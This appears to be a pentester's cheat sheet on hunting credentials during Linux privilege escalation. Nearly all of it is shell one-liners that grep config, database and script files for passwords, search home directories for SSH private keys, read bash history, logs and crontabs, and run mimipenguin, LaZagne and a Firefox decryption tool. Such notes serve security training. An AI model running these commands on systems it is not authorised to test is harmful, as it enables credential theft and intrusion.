

> Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

---
#### Configuration Files

```
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

##### Credentials in Configuration Files

```
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

#bashscripting 
#### Databases

```
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#database
#### Notes

```
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

#bashscripting
#### Scripts

```
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#### Cronjobs

```
$ cat /etc/crontab
```

```
$ ls -la /etc/cron.*/
```

#crontab
#### SSH Keys

```
$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```


```
$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

#ssh 


#### Bash History

```
$ tail -n5 /home/*/.bash*
```

#bashscripting #history

#### Logs

```
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

#logs #bashscripting 

#### Memory - Mimipenguin

```
$ sudo python3 mimipenguin.py
```

```
$ sudo bash mimipenguin.sh
```

#python #bash

#### Memory - LaZagne

```
$ sudo python2.7 laZagne.py all
```

```
$ python3 laZagne.py browsers
```

#lazagne #browser 

#### Firefox Stored Credentials

```
$ ls -l .mozilla/firefox/ | grep default 
```

```
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#firefox #browser

#### Decrypting Firefox Credentials

```
$ python3.9 firefox_decrypt.py
```

#firefox #browser 